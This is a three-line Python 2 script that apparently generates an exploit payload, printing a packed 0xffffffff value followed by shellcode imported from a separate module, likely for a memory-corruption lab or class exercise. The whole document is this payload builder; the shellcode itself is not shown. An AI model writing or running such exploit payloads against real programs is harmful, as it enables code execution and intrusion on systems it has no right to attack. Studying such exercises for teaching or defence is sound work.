from struct import pack
from shellcode import shellcode

print pack("<I", 0xffffffff) + shellcode
